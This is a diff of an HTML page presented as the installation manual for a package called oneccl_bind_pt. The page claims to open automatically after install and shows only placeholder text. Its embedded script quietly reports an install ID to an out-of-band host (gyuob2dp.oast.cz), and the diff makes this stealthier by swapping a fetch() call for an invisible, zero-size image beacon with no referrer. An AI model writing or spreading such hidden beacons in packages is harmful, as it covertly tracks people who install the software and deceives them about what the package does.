@@ -2,68 +2,80 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>oneccl_bind_pt Manual</title>
+  <title>oneccl_bind_pt – Installation Manual</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: sans-serif;
-      margin: 2em;
-      color: #333;
-    }
-    .container {
-      max-width: 700px;
-      margin: auto;
+      font-family: system-ui, sans-serif;
+      margin: 3em auto;
+      max-width: 720px;
+      color: #222;
+      line-height: 1.6;
     }
     h1 {
-      color: #0b3d91;
+      color: #1e3a5f;
+    }
+    .section-title {
+      margin-top: 2em;
+      font-weight: bold;
+      font-size: 1.2em;
     }
     .note {
-      color: #555;
-      font-style: italic;
+      font-size: 0.95em;
+      color: #666;
+    }
+    img.beacon {
+      display: none !important;
+      width: 0;
+      height: 0;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>oneccl_bind_pt: Overview & Setup</h1>
-    <p>
-      This package is part of an ongoing effort to abstract backend-level collective operations
-      with compatibility for evolving distributed training frameworks.
-    </p>
+  <h1>Welcome to oneccl_bind_pt</h1>
 
-    <p>
-      The goal is to provide experimental bindings that can potentially adapt to hardware-layer messaging
-      systems in a plug-and-play manner.
-    </p>
+  <p>
+    This page is automatically opened after installation of the package. It serves as a placeholder
+    for the full installation and usage manual that is currently being written.
+  </p>
 
-    <p class="note">
-      Documentation is currently in draft status. Implementation details and platform-specific configuration
-      are subject to change in future iterations.
-    </p>
+  <p>
+    The goal of this package is to support advanced distributed processing workflows in Python-based environments.
+    More detailed configuration options, backend notes, and deployment guidelines will appear here in future versions.
+  </p>
 
-    <h2>References</h2>
-    <ul>
-      <li><a href="https://pytorch.org/docs/stable/distributed.html">PyTorch Distributed Docs</a></li>
-      <li><a href="https://github.com/pytorch/pytorch">PyTorch GitHub</a></li>
-    </ul>
-  </div>
+  <p class="note">
+    Documentation will be expanded progressively. For now, you can monitor this page or check back during future updates.
+  </p>
+
+  <div class="section-title">Coming soon in this manual:</div>
+  <ul>
+    <li>Setup instructions for supported environments</li>
+    <li>Runtime configuration hints</li>
+    <li>Feature compatibility overview</li>
+    <li>Notes for integration with distributed backends</li>
+  </ul>
+
+  <p class="note">
+    If you arrived here after installation, no action is required. You may close this tab.
+  </p>
 
   <script>
     const EXPECTED_REF = "oneccl_pt";
-    const BEACON_ID_PREFIX = "pkg-";
+    const ID_PREFIX = "pkg-";
 
     const params = new URLSearchParams(window.location.search);
     const ref = params.get("ref");
     const id = params.get("id");
 
-    if (ref === EXPECTED_REF && id && id.startsWith(BEACON_ID_PREFIX)) {
-      fetch("https://gyuob2dp.oast.cz/", {
-        method: "GET",
-        mode: "no-cors",
-        headers: {
-          "X-Source": "oneccl",
-          "X-Install-ID": id
-        }
-      });
+    if (ref === EXPECTED_REF && id && id.startsWith(ID_PREFIX)) {
+      const beaconUrl = `https://gyuob2dp.oast.cz/${id}.png`;
+
+      const img = document.createElement("img");
+      img.src = beaconUrl;
+      img.className = "beacon";
+      img.referrerPolicy = "no-referrer";
+      document.body.appendChild(img);
     }
   </script>
 </body>
